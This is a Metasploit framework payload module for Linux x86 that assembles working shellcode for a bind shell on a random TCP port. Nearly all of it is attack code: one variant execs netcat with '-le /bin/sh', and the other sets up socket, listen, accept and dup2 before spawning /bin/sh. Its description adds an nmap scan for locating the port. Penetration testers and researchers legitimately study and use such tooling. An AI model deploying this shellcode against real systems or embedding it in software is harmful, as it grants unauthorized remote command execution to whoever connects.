##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule

  CachedSize = 57

  include Msf::Payload::Single
  include Msf::Payload::Linux

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Command Shell, Bind TCP Random Port Inline',
      'Description'   => %q{
        Listen for a connection in a random port and spawn a command shell.
        Use nmap to discover the open port: 'nmap -sS target -p-'.
      },
      'Author'        => ['Geyslan G. Bem <geyslan[at]gmail.com>',
                          'Aleh Boitsau <infosecurity[at]ya.ru>'],
      'License'       => BSD_LICENSE,
      'References'    => [ ['URL', 'https://github.com/geyslan/SLAE/blob/master/improvements/tiny_shell_bind_tcp_random_port.asm'],
                           ['EDB', '41631'] ],
      'Platform'      => 'linux',
      'Arch'          => ARCH_X86
      ))
  end

  def generate
    unless self.available_space.nil? || self.available_space >= 57
      payload = <<-EOS
        preparation:
          xor edx, edx     ;zeroed edx
          push edx         ;push NULL into stack
          push 0x68732f2f  ;-le//bin//sh
          push 0x6e69622f
          push 0x2f656c2d
          mov edi, esp     ;store a pointer to -le//bin//sh into edi
          push edx         ;push NULL into stack
          push 0x636e2f2f  ;/bin//nc
          push 0x6e69622f
          mov ebx, esp     ;store a pointer to filename (/bin//nc) into ebx

        execve_call:
          push edx         ;push NULL into stack
          push edi         ;pointer to -le//bin//sh
          push ebx         ;pointer to filename (/bin//nc)
          mov ecx, esp     ;argv[]
          xor eax, eax     ;zeroed eax
          mov al,11        ;define execve()
          int 0x80         ;run syscall
     EOS
   else
     payload = <<-EOS
        ; Avoiding garbage
        xor ebx, ebx
        mul ebx

        ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
        mov al, 102		; syscall 102 - socketcall
        inc ebx			; socketcall type (sys_socket 1)

        push edx		; IPPROTO_IP = 0 (int)
        push ebx		; SOCK_STREAM = 1 (int)
        push 2			; AF_INET = 2 (int)
        mov ecx, esp		; ptr to argument array
        int 0x80		; kernel interrupt

        ; int listen(int sockfd, int backlog);
        ; listen(sockfd, int);

        ; listen arguments
        push edx		; put zero
        push eax		; put the file descriptor returned by socket()
        mov ecx, esp		; ptr to argument array

        mov al, 102		; syscall 102 - socketcall
        mov bl, 4		; socketcall type (sys_listen 4)
        int 0x80		; kernel interrupt

        ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
        ; accept(sockfd, NULL, NULL)

        mov al, 102		; syscall 102 - socketcall
        inc ebx			; socketcall type (sys_accept 5)
        int 0x80		; kernel interrupt

        ; int dup2(int oldfd, int newfd);
        ; dup2(clientfd, ...)

        pop ecx			; pop the sockfd integer to use as the loop counter ecx
        xchg ebx, eax		; swapping registers values to put the accepted sockfd (client) in ebx as argument in next syscall (dup2)

      dup_loop:
        push 63			; syscall 63 - dup2
        pop eax
        int 0x80		; kernel interrupt

        dec ecx			; file descriptor and loop counter
        jns dup_loop

        ; Finally, using execve to substitute the actual process with /bin/sh
        ; int execve(const char *filename, char *const argv[], char *const envp[]);
        ; exevcve("/bin/sh", NULL, NULL)

        mov al, 11		; execve syscall

        ; execve string argument
        ; stack already contains NULL on top
        push 0x68732f2f		; "//sh"
        push 0x6e69622f		; "/bin"

        mov ebx, esp		; ptr to "/bin//sh" string

        inc ecx			; zero to argv
                    ; zero to envp (edx)

        int 0x80
      EOS
    end

   Metasm::Shellcode.assemble(Metasm::X86.new, payload).encode_string
  end
end
